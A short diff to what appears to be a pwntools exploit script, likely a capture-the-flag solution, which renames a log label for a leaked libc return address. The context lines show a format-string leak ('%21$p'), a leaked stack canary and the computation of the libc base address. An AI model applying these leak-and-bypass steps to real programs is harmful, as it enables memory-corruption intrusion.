@@ -37,7 +37,7 @@ def main():
 	log.info("Leaked canary:  %s " % hex(leaked_canary))
 	
 	libc_address = fight("%21$p")
-	log.info("Leaked __libc_ret_main: %s " % hex(libc_address))
+	log.info("Leaked __libc_start_main_ret: %s " % hex(libc_address))
 	base_address = libc_address - (libc.sym.__libc_start_main + 231)
 	log.info("libc_base_address: %s " % hex(base_address))
 	
